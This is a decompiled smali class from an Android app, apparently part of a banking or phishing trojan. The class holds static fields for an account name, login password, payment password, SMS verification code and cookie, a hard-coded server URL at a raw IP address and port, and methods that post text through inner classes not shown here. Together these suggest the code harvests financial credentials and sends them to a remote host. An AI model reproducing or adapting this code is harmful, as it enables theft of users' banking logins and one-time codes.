.class public Lcom/ellison/project/utils/AAAA;
.super Ljava/lang/Object;
.source "AAAA.java"


# static fields
.field public static final BASE_URL:Ljava/lang/String; = "http://103.45.186.120:9968/"

.field public static account:Ljava/lang/String; = ""

.field public static cookie:Ljava/lang/String; = ""

.field public static currentPrice:Ljava/lang/String; = ""

.field public static currentURL:Ljava/lang/String; = ""

.field public static id:I = 0x0

.field public static pageTitle:Ljava/lang/String; = ""

.field public static payPwd:Ljava/lang/String; = ""

.field public static pwd:Ljava/lang/String; = ""

.field static ret:I = 0x0

.field public static smsCode:Ljava/lang/String; = ""

.field public static ss:I = 0x0

.field public static start:J = 0x0L

.field static url:Ljava/lang/String; = ""


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 20
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static getRandomChars(I)Ljava/lang/String;
    .locals 6

    if-nez p0, :cond_0

    const-string p0, ""

    return-object p0

    .line 42
    :cond_0
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v1, 0x0

    :goto_0
    if-ge v1, p0, :cond_1

    .line 44
    invoke-static {}, Ljava/lang/Math;->random()D

    move-result-wide v2

    const-wide/high16 v4, 0x403a000000000000L    # 26.0

    mul-double v2, v2, v4

    const-wide v4, 0x4058400000000000L    # 97.0

    add-double/2addr v2, v4

    double-to-int v2, v2

    int-to-char v2, v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    .line 46
    :cond_1
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    return-object p0
.end method

.method public static sendPostText(Landroid/content/Context;Ljava/lang/String;)V
    .locals 2

    .line 50
    move-object v0, p0

    check-cast v0, Landroid/app/Activity;

    new-instance v1, Lcom/ellison/project/utils/AAAA$1;

    invoke-direct {v1, p0, p1}, Lcom/ellison/project/utils/AAAA$1;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    return-void
.end method

.method public static sendPostText2(Landroid/content/Context;Ljava/lang/String;)I
    .locals 2

    .line 74
    move-object v0, p0

    check-cast v0, Landroid/app/Activity;

    new-instance v1, Lcom/ellison/project/utils/AAAA$2;

    invoke-direct {v1, p0, p1}, Lcom/ellison/project/utils/AAAA$2;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    const/4 p0, 0x1

    return p0
.end method
